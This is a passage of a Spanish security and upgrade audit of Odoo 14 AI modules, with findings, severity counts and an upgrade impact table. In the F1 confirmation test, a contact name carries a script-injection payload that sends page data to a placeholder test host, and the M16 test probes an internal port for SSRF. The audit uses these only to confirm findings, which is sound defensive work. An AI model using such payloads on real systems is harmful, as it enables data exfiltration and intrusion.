  y deja sin efecto el VERIFICADO de §2.1 para esa ficha en cuanto a su «Check para Seges».
- **P-8f:** interno sin grupos de IA y portal: `call_kw('ai.execution.engine', 'log_llm_inference', [[],
  False, {'prompt_tokens': 1000}], {'endpoint': 'p8f', 'user_id': 2})`. `SELECT user_id, endpoint,
  prompt_tokens FROM ai_log WHERE endpoint = 'p8f'`. Esperado si está bien: `AccessError` y ninguna fila.
  (`tool_name` se guarda en la columna `endpoint`, `models/ai_log.py:698-702`.)

#### M12 (Baja) — NO CORREGIDO: inferencia directa con `chat_completion`

- **P-8g:** interno sin grupos de IA ni clave MCP: `call_kw('ai.execution.engine', 'chat_completion',
  [[], 'pns_ai_chatboo', [{'role': 'user', 'content': 'hola'}]])`. Esperado si está bien:
  `AccessError`. Hoy se espera una respuesta del modelo y su fila en `ai.log`.

#### F1 (Media) — PARCIAL: el lienzo puede sacar datos fuera

- Ver la fila. El `sandbox` protege la sesión de Odoo, pero no limita la red del documento.
- **P-8e:** (a) en un contacto legible, nombre `x</script><script>new Image().src='https://<host de
  prueba>/?d='+encodeURIComponent(JSON.stringify(DATA))</script>`; pedir en Chatboo una lista de
  contactos que lo incluya y pulsar Canvas; abrir la página; mirar el log del host de prueba. (b) Con el
  mismo host, `page_html` (P-8d) con un documento que haga `fetch('https://<host de prueba>/')`.
  Esperado si está bien: ninguna petición al host de prueba (CSP o escape de `</`).

#### D1 (Baja) — PARCIAL: páginas compartidas

- **P-8h:** usuario A crea y comparte una página con B; como A, `write` de `owner_id = C` por `call_kw`.
  Esperado si está bien: rechazo. Como AI Administrator sin relación con la página: abrir
  `/chatboo/page/<id>`; hoy se espera que la vea (regla `[(1,'=',1)]`, decisión de diseño a aceptar o no).

#### M5 y M16 (Baja) — PARCIAL

- **M5:** `cron_maintenance` público solo adelanta lo que hace el cron; no se propone prueba.
- **M16:** prueba solo si se quiere medir el SSRF: como AI Administrator, una fuente con
  `http://127.0.0.1:8069/web/webclient/version_info` y `call_kw` a `ai.fx.source.get_usd_fx` como
  interno: el `error` devuelto enseña la respuesta del puerto interno (hoy se espera un error de
  JSON o de «no usable rates», que confirma la conexión).

#### F4 (Baja) — NO CORREGIDO: el PDF exportado desde el chat muestra el HTML de la tabla como texto

- **Hallazgo de la fase 3** (P-6 ampliada, caso c, 23/10/2026), no de la lectura de código.
- **Qué se ve:** en el PDF descargado desde la ficha de PDF del chat («Preparar y descargar»), antes de
  la tabla aparece como texto el HTML del bloque de tabla, con los `_` de las clases `o_ai_*` perdidos
  (`oaitableblock`, `oaidatatable`). En el chat el mismo turno se ve bien.
- **Dato guardado:** en `chatboo_session.messages`, el turno empieza por el `div` del bloque de tabla
  (`o_ai_table_block`) seguido de la prosa.
- **Origen:** el exportador a PDF del lado del cliente (`pns_ai_chatboo/static/src/js/chatboo_export.js`).
  No se ha localizado la línea ni comprobado si pasa también en 3.1.782 (el archivo cambia entre las
  dos versiones).
- **Efecto:** funcional, sin efecto de seguridad. El PDF de esa prueba traía además datos inventados por
  el modelo en un turno anterior: es cosa del modelo, no del exportador.
- **Prueba:** repetir una exportación a PDF de un turno con tabla y comprobar que el PDF no tiene texto
  antes de la tabla.

**Recuento §8 (39 elementos evaluados; las remisiones de §8.6 y D4 no se cuentan; F4 se añade el
23/10/2026):**

| Estado | N.º | Elementos |
|---|---|---|
| VERIFICADO | 28 | Rutas: las 10 filas de §8.1 · Métodos: M3, M4, M6, M7, M8, M9, M14, M15 · Modelos: D2, D3, D5, D6, D7, D8 · Funciones: F2, F3 · Correcciones no anunciadas: C1, C2 (D4 remite a §2.1) |
| PARCIAL | 4 | F1 (Media), D1 (Baja), M5 (Baja), M16 (Baja) |
| NO CORREGIDO | 7 | M13 (Alta, confirmado), M10 (Crítica, requiere AI Administrator; confirmado), M1 (Media), M2 (Media), M11 (Media), M12 (Baja), F4 (Baja, fase 3) |
| REQUIERE PRUEBA (como estado principal) | 0 | Todas las filas NO CORREGIDO y PARCIAL llevan su prueba de confirmación (P-8a a P-8h) |

**Por gravedad propuesta (PARCIAL y NO CORREGIDO):**

| Gravedad | N.º | Elementos | Nuevos en 3.1.879 | Ya en 3.1.782 (y en la rama) |
|---|---|---|---|---|
| Crítica | 1 | M10 | — | M10 |
| Alta | 1 | M13 | M13 | — |
| Media | 4 | M1, M2, F1, M11 | M1, M2, F1 | M11 (salvo `log_role_without_provider`) |
| Baja | 5 | M12, D1, M5, M16, F4 | D1 | M12, M5, M16 (F4: sin comprobar) |

## 9. Actualización desde 3.1.782

**Método.** Comparación de los dos árboles: manifest, carpetas `migrations/` (Glob), métodos `init()`,
`_auto_init` y `_register_hook` (Grep), `data/`, `security/` y declaraciones de campo (Grep de
`^\s+\w+ = fields\.` en los tres módulos: 600 coincidencias en 3.1.782 y 644 en 3.1.879, revisadas
modelo a modelo donde el número o la lista cambia). Lectura del core de Odoo 14 para versiones,
migraciones y limpieza de fin de actualización (`_process_end`). Sin ejecutar Odoo ni consultar
ninguna BD. Los datos que dependen de la BD se marcan **REQUIERE PRUEBA** (P-9a a P-9f, §9.5).

**Entornos de partida:**
- **LIYBEN:** instalación nueva (no actualización) de `pns_base` 1.2.32, `pns_ai_mcp` 3.1.782 y
  `pns_ai_chatboo` 2.1.453 con los parches 1 a 6, el 16/10/2026
  (`docs/pendiente/instalacion_liyben_pns_ai.md:30-32, 146`).
- **`pns_demo` (staging):** instalación nueva de 3.1.782 (`docs/pendiente/plan_staging_pns_ai.md:40-42`),
  actualizada después con los parches 1 a 12, que no cambian `version` (`parches_pns_ai.md:19-20`).
- Ninguno viene de 3.1.486 (`plan_staging_pns_ai.md:207-217`): los restos de esa época (renombrados
  `mcp_*`, tablas fósiles) no existen en ellos.

### 9.1 Versiones, migraciones y cómo las compara Odoo 14

| Módulo | 3.1.782 | Rama (parches 1-12) | 3.1.879 | Instalada en LIYBEN | `migrations/` (la más alta, en los tres árboles) |
|---|---|---|---|---|---|
| `pns_base` | 1.2.32 (`_fabricante/3.1.782/pns_base/__manifest__.py:8`) | 1.2.32 (`pns_base/__manifest__.py:8` (rama)) | 1.2.47 (`pns_base/__manifest__.py:8`) | 14.0.1.2.32 (`instalacion_liyben_pns_ai.md:146`) | Ninguna carpeta en los tres (Glob) |
| `pns_ai_mcp` | 3.1.782 (`:8`) | 3.1.782 (`:8` (rama)) | 3.1.879 (`:8`) | 14.0.3.1.782 | 3.1.643 (606, 636, 642, 643 en los tres) |
| `pns_ai_chatboo` | 2.1.453 (`:7`) | 2.1.453 (`:7` (rama)) | 2.1.538 (`:7`) | 14.0.2.1.453 | 2.1.343 (300, 301, 336, 343 en los tres) |

- **Scripts de migración nuevos: ninguno** (confirmado: Glob de `migrations/3.1.[6-9]*` y
  `migrations/2.1.[3-9]*` en los tres árboles da las mismas carpetas; no hay carpeta `0.0.0`). Cambia el
  contenido de tres scripts de Chatboo (2.1.296, 2.1.300 y 2.1.343, PNS-68, §5.2), sin efecto porque no
  se ejecutan.
- **Cómo lee Odoo 14 la versión:** `adapt_version` antepone la serie si no la lleva: `1.2.47` →
  `14.0.1.2.47` (`odoo/modules/module.py:366, 441-445`). Al terminar el `-u` de cada módulo escribe esa
  versión en `latest_version` sin compararla con la instalada (`odoo/modules/loading.py:277-279`).
- **Por qué no se ejecuta ningún script:** `convert_version` da por hecho que una carpeta con dos o más
  puntos ya lleva la serie (`odoo/modules/migration.py:108-111`), así que `3.1.643` se compara tal cual
  con la instalada `14.0.3.1.782` (`:144-146, 161`): `14.0.3.1.782 < 3.1.643` es falso. En Odoo 14 no
  corre ningún script de `pns_ai_mcp` ni de `pns_ai_chatboo`, de esta ni de ninguna versión (lo mismo
  dice el fabricante, `pns_ai_mcp/utils/schema_fossils.py:6-10`, y §5.2, PNS-68). Todo lo que el `-u`
  cambia en datos va en los `init()` (§9.2).
- **Versión menor que la instalada:** Odoo 14 no avisa ni falla. El `-u` carga el módulo y escribe la
  versión menor (`loading.py:277-279`); «Actualizar lista de aplicaciones» solo cuenta como pendientes
  las de versión mayor (`odoo/addons/base/models/ir_module.py:745-746`), y los scripts del tramo no se
  ejecutan (`migration.py:161`, rango vacío).

**Versión real de `pns_base`.**
- El registro del fabricante da dos números por entrega, Odoo 14 / Odoo 19: 1.2.36 / 1.2.46
  (auditoría `:527`, «`pns_base` 1.2.36 (Odoo 14) / 1.2.46 (Odoo 19)»; `:1087`), 1.2.37 / 1.2.47
  (`:760, 771`, «1.2.37 (`d3113b9`, Odoo 14)»; `:1096`) y 1.2.38 / 1.2.48 (`:909, 1103`). Desde la 17.ª
  entrega, `pns_base` «sin cambios» (`:1104-1108`). **1.2.47 es el número de Odoo 19 de la 9.ª
  entrega.**
- El código es de la rama de Odoo 14: JS legacy con `odoo.define` en sus cuatro ficheros
  (`pns_base/static/src/js/pns_row_link_v14.js`, `pns_invalid_fields_dedupe.js`, `pns_module_index.js`;
  ninguno con `@odoo-module`), `fields_view_get` (`pns_base/models/ir_ui_view_patch.py:507`),
  `ir_translation.py` y assets por plantilla (`views/assets.xml`). Es código multiversión que decide
  por `ODOO_VERSION` (`pns_base/utils/compat.py:13-31`).
- Por funciones es **1.2.38 o posterior**: trae `action_preview`, la vista previa de importación de la
  16.ª entrega (`pns_base/models/operation_report_wizard.py:305-323`; auditoría `:909`), que no existe en
  3.1.782 (Grep de `preview` en `_fabricante/3.1.782/pns_base`: vacío). Ningún otro sitio del paquete
  cita una versión de `pns_base` (Grep de `1.2.3x`/`1.2.4x`: solo el manifest).
- **Conclusión:** el número del manifest (1.2.47, Odoo 19, 9.ª entrega) no casa con el contenido (1.2.38,
  Odoo 14, 16.ª entrega). Leyendo el código no se puede saber si es la 1.2.38 con el número cambiado u
  otra compilación: hace falta el commit del fabricante.
- **Efecto en el `-u` desde 1.2.32:** ninguno hoy: 14.0.1.2.47 es mayor y `pns_base` no tiene
  migraciones ni datos nuevos (§9.2, U1). **Efecto a futuro:** si el fabricante corrige la numeración y
  entrega 1.2.38, 1.2.39…, quedarían por debajo de la 14.0.1.2.47 instalada: el `-u` funciona sin aviso,
  Aplicaciones no la ofrece como actualización y cualquier script futuro de `pns_base` en ese tramo no
  se ejecutaría. `odoo-dev 14 paridad` lo mostraría como «VERSIÓN distinta» (formato en
  `parches_pns_ai.md:617-620`). El sello de la resiembra de fábrica usa `latest_version`
  (`pns_ai_mcp/hooks.py:226-243`), pero solo de módulos con `ai/`: `pns_base` no entra.

### 9.2 Qué hace el `-u` desde 3.1.782, paso a paso

Orden del fabricante: `pns_base`, `pns_ai_mcp`, `pns_ai_chatboo` y, después, Ajustes → Idiomas →
Recargar (auditoría `:1076-1077, 1249`). El orden no cambia nada: `-u pns_ai_mcp` también actualiza los
módulos que dependen de él, `pns_ai_chatboo` incluido (`odoo/addons/base/models/ir_module.py:636-666`),
así que los tres se actualizan siempre juntos. En cada módulo, Odoo 14 ejecuta los `init()` de sus modelos al
preparar el esquema (`loading.py:195-199`), carga `data` (`:222`) y, al final de toda la carga, borra lo
que el módulo ya no declara: registros con XML ID y `noupdate` falso, y campos quitados del código
(`odoo/addons/base/models/ir_model.py:2254-2332`). El `post_init_hook` solo corre al instalar
(`loading.py:236-240`).

| Id | Módulo y paso | Qué hace (3.1.879, archivo:línea) | Efecto en LIYBEN y `pns_demo` | Notas de versión (auditoría) | Resultado |
|---|---|---|---|---|---|
| U1 | `pns_base`: datos | La misma lista de `data` (`pns_base/__manifest__.py:53-61`; 3.1.782 `:51-59`) y el mismo cron (`data/export_purge_cron.xml`); mismos ficheros de modelos (Glob) | Ninguno en datos. En código: `fields_view_get` global y `_alias_groups_vals` (§5.7, PB-2) | 9.ª (`:1177-1180`), 16.ª (`:1140-1142`) | Coincide |
| U2 | `pns_ai_mcp`: `ai.schema.fossil.init`, tablas fósiles | `DROP TABLE IF EXISTS … CASCADE` de 11 tablas (`models/ai_schema_fossil.py:29-33`; `utils/schema_fossils.py:17-31`). Sale `ai_provider_usage_day`, que 3.1.782 sí tiraba (`_fabricante/3.1.782/pns_ai_mcp/utils/schema_fossils.py:27`); ninguna de las dos versiones tiene ese modelo (Grep de `usage_day`: solo `.po` y listas de exportación) | Sin efecto: en una instalación nueva de 3.1.782 esas tablas no existen, y `ai_provider_usage_day` la tiró el propio `init()` de 3.1.782 | 20/10 (`:1229-1231`): «el `-u` ya no tira `ai_provider_usage_day`» | Cierto; sin efecto aquí |
| U3 | `rename_leftover_xmlids` (nuevo) | `UPDATE ir_model_data` de 27 nombres `mcp_*` → `ai_*`, si el nuevo no existe (`ai_schema_fossil.py:34`; `schema_fossils.py:69-114`) | Sin efecto esperado: sin nombres `mcp_*` en una instalación nueva (`plan_staging_pns_ai.md:64`). **REQUIERE PRUEBA** (P-9a) | Ficha PNS-88 (`:676-688`) | Sin efecto (§5.6, PNS-88) |
| U4 | `promote_compose_column`, `promote_turn_columns`, `promote_decision_provider` | Idénticas a 3.1.782 (`schema_fossils.py:126-255`; 3.1.782 `:65-194`) | Ya aplicadas en la instalación; sin efecto | — | Sin cambio |
| U5 | `drop_leftover_columns` | Añade `ai_mcp_user.key_pin`, `key_pin_used`, `key_pin_killed` (`schema_fossils.py:58-62`), campos de 3.1.782 (`_fabricante/3.1.782/pns_ai_mcp/models/mcp_user.py:142-144`) | Se borran las tres columnas. LIYBEN: ningún PIN generado (`instalacion_liyben_pns_ai.md:163`). `pns_demo`: se pierden los PIN que hubiera (incidencia del staging con «Regenerate PIN», `instalacion_liyben_pns_ai.md:184`) | 20/10 (`:1236-1238`): «las columnas se borran solas» | Coincide |
| U6 | `promote_engine_params` (nuevo) | Renombra los parámetros `pns_ai_chatboo.chart_engine`, `default_show_mode` (y `default_showmode`), `xlsx_float_decimals`, `xlsx_thousands` y `download_max_bytes` a `pns_ai.*` (`ai_schema_fossil.py:39`; `schema_fossils.py:264-295`; claves en `utils/engine_params.py:10-14, 30-37`). Borra su `ir_model_data` (`:279-283`); si la clave nueva ya existe, borra la vieja (`:284-290`) | Los cinco los creó `chatboo_icp_data.xml` al instalar (3.1.782 `data/chatboo_icp_data.xml:4-27`): conservan el valor con otro nombre y dejan de pertenecer a `pns_ai_chatboo`. Chatboo 3.1.879 lee los nombres nuevos (`pns_ai_chatboo/utils/chatboo_product_icp.py:10-26`). Un código 3.1.782 sobre esa BD ya no los encontraría (vuelta atrás: §9.4) | **No figura** (Grep de `promote_engine`, `engine_params` y `pns_ai.chart` en la auditoría: vacío) | No anunciado; sin pérdida |
| U7 | `ai.agent.init` | `_drop_acl_security_factory_fossil` recorre ahora todos los agentes `origin='module'`, con una marca por agente (`models/ai_agent.py:215-235, 250-273`); en 3.1.782 solo el de `pns_ai_mcp` (3.1.782 `ai_agent.py:251-272`, marca única `:258`) | En el primer `-u` quita la línea `acl_security` de `default_context_codes` del agente de Chatboo (y de cualquier agente de módulo) y crea un parámetro `<código>.fossil_acl_security_agent` por agente. Si alguien la había puesto a mano, se quita una vez | Ficha PNS-76 (`:716-727`) | Coincide con la ficha |
| U8 | `ai.safe.operation.init` | `_align_executed_status`, igual que en 3.1.782 (`models/safe_operation.py:1888-1900`; 3.1.782 `:1831-1843`) | Sin cambio | — | Sin cambio |
| U9 | Fin del `-u` (core): campos quitados | `ai.log.agent_id` (3.1.782 `models/ai_log.py:68-75`) no existe en 3.1.879 (Grep de `agent_id` en `ai_log.py`: vacío). Odoo 14 borra al final del `-u` los `ir.model.fields` del módulo cuyo XML ID no se ha cargado (`ir_model.py:2254-2328`, con el aviso «Deleting field … should be explicitly removed by an upgrade script», `:2322-2327`); ese XML ID lo crea el propio módulo al reflejar el campo (`:1079-1101`), y borrar un campo almacenado hace `ALTER TABLE … DROP COLUMN … CASCADE` (`:825-871` → `_drop_column`, `:725-739`) | **Se perdería la columna `ai_log.agent_id`** con el agente de las filas viejas. LIYBEN: filas desde el 19/10, retención de 30 días (`instalacion_liyben_pns_ai.md:155`). Las columnas `key_pin*` caen por la misma vía (ya borradas en U5) | Ficha PNS-87 (`:668`): «La columna se queda con el agente de las filas viejas»; 20/10 (`:1229-1231`): «el `-u` ya no tira … la columna `ai_log.agent_id`»; también `schema_fossils.py:47-48` | **Contradice** a la auditoría: sacarla de `LEFTOVER_COLUMNS` no basta. **Confirmado** en P-9b (§9.6) |
| U10 | Selección `origin = 'chatboo'` (en `ai.log` y en `ai.change.journal`) | Pasa de `pns_ai_mcp` (3.1.782 `ai_log.py:56-61`) a `pns_ai_chatboo` con `selection_add` y un `ondelete` que no hace nada (`pns_ai_chatboo/models/ai_log_door.py:11-33`) | Con los tres módulos en el mismo `-u`, el valor lo declara Chatboo y Odoo solo borra el XML ID viejo (`ir_model.py:2307-2315`); si borrara el valor, el `ondelete` invocable no toca filas (`:1438-1447`). Las filas de `ai_log` y `ai_change_journal` conservan `origin`. Actualizar `pns_ai_mcp` solo no puede darse (arrastra a Chatboo, intro de §9.2). Recuento en P-9a | — | No anunciado; sin pérdida esperada |
| U11 | Agente «Decision» (`pns_ai_decision`) | 3.1.782 lo sembraba (`data/ai_agent_data.xml:38-51`, `noupdate="1"`) y tomaba de él la cadena de decisión (`models/ai_execution_engine.py:257-261`; `utils/ai_agent_registry.py:18`). 3.1.879 no lo siembra ni lo nombra (Grep: vacío) y usa la cadena del agente que llama con `need='decision'` (`models/ai_execution_engine.py:334`) | Odoo 14 no borra registros `noupdate` al actualizar (`ir_model.py:2269-2272`): el agente queda huérfano y lo configurado en su cadena deja de usarse. En LIYBEN la cadena está en el agente Chatboo (Gemini y OVH, `instalacion_liyben_pns_ai.md:241`): la decisión pasa a esa cadena, filtrada por la casilla Decision. Qué pasa si ningún proveedor la tiene: **REQUIERE PRUEBA** (P-9d) | **No figura** (19.ª, `:1125`, habla del orden por monorol, no del agente) | No anunciado |
| U12 | `pns_ai_mcp`: crons | Nuevo `data/journal_trash_cron.xml` (`noupdate="1"`, activo, diario, `numbercall` -1, sin `user_id`: `:2-15`). Los otros cinco crons de los tres módulos tienen el mismo XML ID, código e intervalo en las dos versiones (Grep de `data/*.xml`) y son `noupdate="1"`: el `-u` no toca su estado | Un cron nuevo activo, que corre con el usuario por defecto (§6.1, PNS-37). Ninguna fila antigua del diario entra en la papelera: `meta.quarantine` solo lo escribe 3.1.879 (`models/ai_change_journal.py:308-309`; `controllers/safe_plan.py:945-960`; Grep en 3.1.782: vacío) y el cron filtra por él (`ai_change_journal.py:541-549`) | 15.ª (`:1147`): papelera de 30 días | Coincide; no dice que el cron sea nuevo ni con qué usuario corre |
| U13 | `pns_ai_mcp`: parámetros y campos nuevos | `pns_ai_mcp.journal_trash_days` (`models/res_config_settings.py:71-79`): sin valor, 30 días (`utils/change_journal.py:16-17, 177-187`). `pns_ai_mcp.mcp_allowed_origins` (`:81-89`): vacío, solo `web.base.url` (`utils/mcp_origin.py:38-49`). `pns_ai_mcp.log_retention_days` pasa a Ajustes (`:62-69`); sin valor, no purga (`models/ai_log.py:904-929`). Topes `spend_cap_usd`/`spend_cap_tokens` por defecto 0, sin tope (`models/ai_provider.py:363-377`). `ai.log.provider_id` nuevo (`models/ai_log.py:172-179`) | LIYBEN: retención de `ai.log` fijada a 30 (`instalacion_liyben_pns_ai.md:155`): sigue purgando a 30 días. `/mcp` cerrado en Nginx (`:137-139`): los orígenes no cambian nada. Sin tope (D12, `pns_ai_decisiones.md:1671`). Las filas anteriores al `-u` no tienen `provider_id`: el consumo del mes del `-u` no cuenta lo gastado antes (`ai_provider.py:1026-1031`) | 2.ª (`:1218`), 12.ª (`:1162`), 15.ª (`:1147`); 20/10 (`:1229-1231`) | Coincide |
| U14 | `pns_ai_mcp`: ACL | Una línea nueva, `ai.provider.usage.wizard` solo AI Administrator (`security/ir.model.access.csv:56`); reglas y grupos sin cambios (§8.3) | Se crea la ACL | — | Sin efecto en datos |
| U15 | Resiembra de fábrica (`_register_hook`) | Cambia el sello de versiones de los módulos con `ai/` (`hooks.py:226-243`) y se resiembra desde disco con candado (`:246-272`; §5.3, PNS-32): el texto de contextos y skills de fábrica sale del disco y `active` se respeta. Ficheros de `pns_ai_mcp/ai/`: los mismos en las dos versiones (Glob). Chatboo añade el contexto `page_tab` y su discovery (`pns_ai_chatboo/ai/contexts/domain/page_tab/page_tab.xml`; `discovery/discovery_page_tab*.json`) y tres skills activas sin `required_groups`: `cash_forecast`, `customer_360` y `pipeline` (`ai/skills/system/cash_forecast.md:1-12`; `customer_360.md:11`; `pipeline.md:11`). No se retira ningún fichero. `chatboo_skill_data.xml` deja de llamar a `unlink_named_factory_skills` en cada `-u` (§6, obs. 11) | Ninguna fila de fábrica se borra. Se pisa el texto de las filas de fábrica editadas a mano (D38). Las tres skills nuevas quedan disponibles para todo usuario de Chatboo y corren con sus permisos (PNS-23, §7) | 8.ª (`:1185`), 20.ª (`:1119`). Las skills nuevas solo en la puesta en marcha (`20261022_pns_ai_puesta_en_marcha.md:118`) | Coincide; skills nuevas no anunciadas en las notas |
| U16 | `pns_ai_chatboo`: `chatboo.session.init` (nuevo) | `DROP COLUMN IF EXISTS canvas_build_started, canvas_build_error` (`models/chatboo_session.py:189-197`) y **reescribe en sitio** `messages` y `canvas_design` de todas las sesiones: `data-chatboo-*` → `data-ai-*` y las clases `o_chatboo_*` de `ENGINE_CLASSES` → `o_ai_*` (`:198-199`; `pns_ai_mcp/utils/markup_rename.py:13-52, 55-72`). Idempotente (`markup_rename.py:7-8`). `chatboo.canvas.page.init` hace lo mismo con `design` (`models/chatboo_canvas_page.py:55-57`; tabla nueva) | Las columnas `canvas_build_*` no existen en 3.1.782 (Grep de `canvas_build` en `_fabricante/3.1.782/pns_ai_chatboo`: vacío): sin efecto. **El historial de todas las sesiones queda reescrito**; no hay vuelta atrás sin copia. Cómo se ve una sesión reescrita con el cliente de 3.1.782: **REQUIERE PRUEBA** (P-9e) | 19/10 (`:1245-1246`): da por perdidas las columnas `canvas_build_*`. La reescritura del historial **no figura** | Columnas: no aplica a 3.1.782. Reescritura: no anunciada |
| U17 | `pns_ai_chatboo`: tablas y columnas nuevas | `chatboo_canvas_page` (con `mail.thread`) y `chatboo_canvas_page_user_rel` (`models/chatboo_canvas_page.py:25-53`), `chatboo_canvas_job` (`models/chatboo_canvas_job.py:22-168`), columnas `canvas_open`, `canvas_design`, `canvas_rev`, `canvas_title`, `canvas_turn` (`models/chatboo_session.py:80-95`). Diez campos de `chatboo.async.request` pasan al mixin `chatboo.job.mixin` con el mismo nombre (`models/chatboo_job.py`; 3.1.782: 23 campos = 13 + 10). `depends` añade `mail` (`__manifest__.py:24`), ya instalado por `pns_base` (`pns_base/__manifest__.py:52`) | Se crean; los campos del mixin los sigue declarando el mismo módulo (sin pérdida esperada; P-9a lo comprueba) | — | Sin pérdida esperada |
| U18 | `pns_ai_chatboo`: ACL y reglas | `chatboo.async.request` de `1,1,1,0` (3.1.782 `security/ir.model.access.csv:3`) a `1,0,0,0` (`csv:3`); líneas nuevas `:4-5`; regla de `chatboo.async.request` sin escritura y reglas nuevas del lienzo (`security/security.xml:20-76`, `noupdate="0"`: se aplican) | Se aplican | Ficha PNS-55 (`:431-437`) | Coincide (§2.1, PNS-55; §8.3) |
| U19 | `pns_ai_chatboo`: semilla `chatboo_icp_data.xml` retirada | Sale del manifest (3.1.782 `__manifest__.py:37`); sus seis registros eran `noupdate="1"` (3.1.782 `data/chatboo_icp_data.xml:3`) y Odoo 14 no los borra (`ir_model.py:2269-2272`). Cinco pierden ya el XML ID en U6 | Queda `pns_ai_chatboo.history_retention_days` con su XML ID y su valor. LIYBEN: 30 (`instalacion_liyben_pns_ai.md:156`): la purga de sesiones a 30 días sigue (`utils/chatboo_product_icp.py:124-131`; §5.2, obs. 5) | Ficha obs. 5 (`:696-698`) | Coincide |
| U20 | `pns_ai_chatboo`: voces remotas | `pns_ai_chatboo.allow_remote_voices` sin valor = `False` (`utils/chatboo_product_icp.py:33, 152-154`) | Tras el `-u`, la lectura en voz alta solo usa voces locales; si no hay, no lee (§6, PNS-64) | 17.ª (`:1135-1136`) | Coincide |
| U17 bis | Campo transitorio eliminado | `ai.skill.capture.wizard.from_chatboo` desaparece | Sin efecto (modelo transitorio) | — | Sin efecto |
| U21 | Traducciones | Odoo 14 no reescribe las ya cargadas | Hay que recargar el idioma | `:1076-1077` | Coincide |

**Resumen de purgas y cambios de datos que pide el encargo:**
- **`ai.log`:** el `-u` no purga; la purga la hace el cron, ahora solo con retención fijada (U13).
  Pérdida: la columna `agent_id` (U9, confirmado en P-9b, §9.6).
- **`ai_provider_usage_day`:** sin efecto; la tabla ya no existe en estos entornos (U2).
- **Skills y contextos de fábrica:** no se borra ninguno; el texto se resiembra desde disco y entran un
  contexto y tres skills nuevas de Chatboo (U15). El agente «Decision» queda huérfano (U11).
- **Sesiones de Chatboo:** no se borran en el `-u`; su historial se reescribe (U16); la purga sigue con
  el parámetro (U19).
- **Parámetros:** cinco se renombran (U6), tres nuevos (U13, U20) y uno pierde el XML ID de su semilla
  (U19).
- **Crons:** uno nuevo y activo, el de la papelera (U12); los demás, sin cambios.
- **Hooks:** ninguno corre en el `-u` (`loading.py:236-240`); solo la resiembra de `_register_hook`
  (U15).

### 9.3 Notas de versión del fabricante frente al código

| Nota (auditoría:línea) | Lo que dice | Código | Resultado |
|---|---|---|---|
| 19/10, desde 3.1.782 (`:1240-1249`) | Se pierden `ai_log.agent_id`, `canvas_build_*` y los borrados de PNS-87 | `agent_id`: se pierde (U9). `canvas_build_*`: no existen en 3.1.782 (U16). PNS-87: superado por la nota del 20/10 (U2, U13) | Parcialmente vigente |
| 20/10 (`:1229-1231`) | El `-u` ya no borra historia: ni `ai_provider_usage_day` ni `ai_log.agent_id` | `ai_provider_usage_day`: cierto (U2). `agent_id`: lo borra el core al quitar el campo (U9) | **Falso en `agent_id`** (confirmado en P-9b, §9.6) |
| 20/10 (`:1236-1238`) | Los PIN guardados desaparecen | U5 | Coincide |
| 2.ª, 12.ª, 15.ª, 17.ª (`:1218, 1162, 1147, 1135-1136`) | Orígenes MCP, topes, papelera, voces | U12, U13, U20 | Coinciden |
| 8.ª y 20.ª (`:1185, 1119`) | Resiembra desde disco y retirada de filas sin fichero | U15 | Coinciden |
| Orden de `-u` (`:1076-1077, 1249`) | `pns_base`, `pns_ai_mcp`, `pns_ai_chatboo`; recargar idiomas | `depends` de los manifest; `-u` de uno arrastra a los que dependen de él (intro de §9.2) | Coincide; el orden no importa |
| — | (No hay nota) | Renombrado de cinco parámetros (U6), agente «Decision» huérfano (U11), reescritura del historial de Chatboo (U16), tres skills nuevas (U15) | **No anunciado** |

La puesta en marcha (`20261022_pns_ai_puesta_en_marcha.md:26-41`) solo describe una instalación nueva;
no trata la actualización. Su frase «El módulo no pone ese tope» (`:21`) no casa con los topes por
proveedor de 3.1.879 (`models/ai_provider.py:363-377`), aunque por defecto valen 0 (U13).

### 9.4 LIYBEN y `pns_demo`: qué hace el `-u` con nuestros parches

Los parches 1 a 12 solo cambian código Python y tests: los 66 marcadores «Seges: parche» de los tres
módulos están en 25 archivos `.py` (Grep), y la regla prohíbe tocar `version`, `depends`,
`external_dependencies` e `i18n` (`parches_pns_ai.md:19-21`). Ningún parche crea campos, datos, XML ID ni
parámetros. Por tanto el `-u` a 3.1.879 no deja en la BD nada huérfano de ellos: el código del parche
desaparece con el archivo sustituido. Lo que cuenta es si 3.1.879 cubre lo mismo (§2.2) y qué datos
dejaron los parches al usarse.

| Parche | LIYBEN | `pns_demo` | Qué hace el `-u` a 3.1.879 con él | Restos en la BD | Cobertura en 3.1.879 |
|---|---|---|---|---|---|
| 1 a 5 | Sí | Sí | Se sustituye el código | Ninguno | Equivalente (§2.2) |
| 6 | Sí | Sí | Se sustituye por la corrección del fabricante (sin restaurar `towrite`/`tocompute`) | Ninguno | Por código; REQUIERE PRUEBA (P-6 ampliada, §5.6) |
| 7, 8, 9 | No | Sí | Mismos nombres privados que el fabricante; desaparecen las líneas de `RELAXAICODE_SIDE_EFFECT_METHODS` en `controllers/validators.py` (el fabricante bloquea todo `_`) | Ninguno | Equivalente; mejor en el sandbox (§2.2) |
| 10 | No | Sí | Igual que 7-9. Las columnas `key_pin*` se borran (U5) | Ninguno | Lo que cubre, sí; entra la vía nueva `collect_pin` (§3, PNS-83) |
| 11 | No | Sí | Desaparecen el filtro de usuario real y la protección de `unlink` | Los adjuntos ajenos que el parche desenganchó al borrar sesiones (`res_model`/`res_id` a `False`, `parches_pns_ai.md:552, 575-578`) siguen huérfanos de su creador; 3.1.879 solo engancha sueltos cuyo creador sea el dueño de la sesión (`pns_ai_chatboo/models/chatboo_session.py:496`) | Parcial (§3, PNS-82) |
| 12 | No | Sí | Desaparece `_check_may_change_user_groups` | Ninguno | Criterio distinto (§2.2) |
| Tests E1 y E2 | No | Sí (código) | `test_seges_rpc_access.py`, `test_seges_user_groups.py` y `pns_ai_chatboo/tests/` no vienen en 3.1.879. Si se sustituyen las carpetas, se pierden; si se superponen, no se importan (`RELAXAICODE_SIDE_EFFECT_METHODS`, §4.1) | Ninguno (los tests no dejan datos) | §4.1 |

**Riesgos propios de cada entorno:**
- **LIYBEN (3.1.782 con los parches 1 a 6):** recibiría de golpe las correcciones del fabricante que en
  la rama son los parches 7 a 12 (con las diferencias de los parches 10 a 12, §2.2). En datos: U5 (sin
  PIN), U6, U9, U11, U16, U19 (retención de 30 días que sigue), U20 (voces) y el cron nuevo de U12. Los
  18 usuarios de portal siguen pendientes de archivar (`instalacion_liyben_pns_ai.md:251`): cuentan para
  M13 y M11 (§8.7), que alcanzan a portal.
- **`pns_demo` (3.1.782 con los parches 1 a 12):** lo mismo, más los PIN de U5 y los adjuntos
  desenganchados del parche 11. Se pierden los tests de E1 y E2 como herramienta de regresión.
